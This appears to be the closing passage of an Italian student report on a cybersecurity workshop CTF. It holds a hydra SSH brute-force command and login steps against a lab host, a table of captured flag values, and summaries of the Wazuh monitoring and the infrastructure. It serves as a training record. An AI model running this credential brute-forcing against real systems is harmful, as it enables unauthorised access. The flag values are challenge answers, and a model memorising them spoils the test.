**Comandi:**

```bash
# lista ruoli tecnici
cat > ~/u3.txt <<'EOF'
ops
deploy
ci
build
tester
qa
sys
app
web
db
git
jenkins
pentest
red
blue
analyst
sysadmin
devops
EOF

hydra -I -L ~/u3.txt -e s -t 4 -f ssh://192.168.50.10:2224
# risultato: login ops / password ops

# accesso e ricerca flag
ssh -p 2224 ops@192.168.50.10
ls -la; cat user.txt 2>/dev/null
ls -la /flags 2>/dev/null; cat /flags/* 2>/dev/null
grep -rh PRODIGI / 2>/dev/null
```

**Flag:** `PRODIGI{… da inserire}`

---

#### 4.3.9 Flag recuperate

| Categoria | Challenge | Porta | Flag |
|---|---|---|---|
| Web | SQL Injection | `:8001` | `PRODIGI{sqli_b3075a032f5b}` |
| Web | Command Injection | `:8002` | `PRODIGI{… da inserire}` |
| Web | Path Traversal / LFI | `:8003` | `PRODIGI{… da inserire}` |
| Web | IDOR | `:8004` | `PRODIGI{… da inserire}` |
| Web | JWT debole | `:8005` | `PRODIGI{jwt_d77b03838b03}` |
| Web | Upload / RCE | `:8006` | `PRODIGI{upload_3648c9842bce}` |
| Web | Backup esposto | `:8007` | `PRODIGI{backup_5a0a0d277d45}` |
| Web | SSRF | `:8008` | `PRODIGI{ssrf_595f3ef63686}` |
| Web | XXE | `:8009` | `PRODIGI{… da inserire}` |
| Web | SSTI | `:8010` | `PRODIGI{… da inserire}` |
| Web | Pickle Deserialization | `:8011` | `PRODIGI{deserial_fec588c4599d}` |
| Forensics | Stego | Reperto #3 | `PRODIGI{stego_a5232ce6b6af}` |
| Forensics | Analisi PCAP | Reperto #2 | `PRODIGI{pcap_a6ad9d4c0f4a}` |
| Forensics | DNS Exfiltration | `dns.pcap` | `PRODIGI{dns_77f9bb69c0c8}` |
| Crypto | XOR | Reperto #1 | `PRODIGI{xor_07887e9c8ed7}` |
| Crypto | Weak RSA | `rsa.txt` | `PRODIGI{rsa_ebb5d2838cbe}` |
| System | SSH Foothold | `:2222` | `PRODIGI{… da inserire}` |
| System | Privilege Escalation | box student | `PRODIGI{box_root_0aa673c0f43e}` |
| System | SSH + privesc SUID | `:2223` | `PRODIGI{suid_983637102669}` |
| System | SSH | `:2224` | `PRODIGI{… da inserire}` |

> Le flag indicate come "da inserire" corrispondono a challenge completate durante la competizione; il valore esatto è recuperabile dagli screenshot allegati.

#### 4.3.10 Risultato della Battle

La competizione ha richiesto l'utilizzo combinato di strumenti di network discovery, enumerazione, analisi web, forensics, crittografia e privilege escalation su Linux. Le prove hanno coinvolto vulnerabilità appartenenti a differenti livelli dello stack applicativo e di sistema.

---

## 5. Risultati e considerazioni tecniche

### 5.1 Infrastruttura e monitoring

Rete privata `192.168.50.0/24` su router ASUS RT-BE88U con configurazione mesh. Raspberry Pi 5 con Ubuntu Server 26.04.1 LTS e accesso SSH tramite chiave pubblica. Wazuh centralizzato per il monitoraggio degli endpoint e la Vulnerability Detection.

### 5.2 Vulnerability Assessment

L'analisi dei risultati Wazuh ha evidenziato l'importanza di non interpretare il numero di vulnerabilità come misura diretta della possibilità di compromissione. La classificazione in base ai prerequisiti di sfruttamento ha permesso di distinguere vulnerabilità locali, dipendenti da hardware specifico e potenzialmente raggiungibili da remoto.

### 5.3 Analisi di CVE-2026-98432

L'approfondimento ha permesso di distinguere tra la presenza della vulnerabilità nel kernel, le condizioni necessarie ad attivare la race condition e i requisiti specifici della catena RCE. I test dello script personalizzato non hanno dimostrato lo sfruttamento. La conclusione tecnica è limitata ai dati di inventario e alle verifiche effettivamente eseguite.

### 5.4 Attività Red Team

La Battle 1 ha permesso di applicare tecniche di ricognizione, enumerazione e analisi su un target autorizzato, coprendo vulnerabilità di applicazioni web, servizi di sistema, file di rete e contenuti crittografici.

---

## 6. Materiale e struttura del repository

```text
report/
├── README.md
├── scripts/
│   └── win-d-demo.txt
├── docs/
│   ├── images/
│   │   ├── flipper-zero/
│   │   ├── raspberry-pi/
│   │   ├── network/
│   │   ├── wazuh/
│   │   └── battle/
│   ├── reports/
│   └── evidence/
│       ├── nmap/
│       ├── wazuh/
│       └── system/
└── configs/
```

### 6.1 Materiale fotografico

| Cartella | Contenuto |
|---|---|
| `docs/images/flipper-zero/` | Confezione, prima accensione e prove con Flipper Zero |
| `docs/images/raspberry-pi/` | Raspberry Pi 5 e collegamenti |
| `docs/images/network/` | Router e cablaggio |
| `docs/images/wazuh/` | Dashboard, agent e Vulnerability Detection |
| `docs/images/battle/` | Briefing e schermate della piattaforma CTF |

### 6.2 Script

Gli script sono conservati in `scripts/`, accompagnati da commenti sul funzionamento e sui requisiti.

### 6.3 Evidenze tecniche

Conservare quando disponibili: output Nmap, esportazioni CSV Wazuh, inventario pacchetti, configurazioni di rete, output dei test, documentazione delle challenge CTF.

---

<sub>ITS Academy Prodigi — Cybersecurity Workshop · 5–6 novembre 2026</sub>
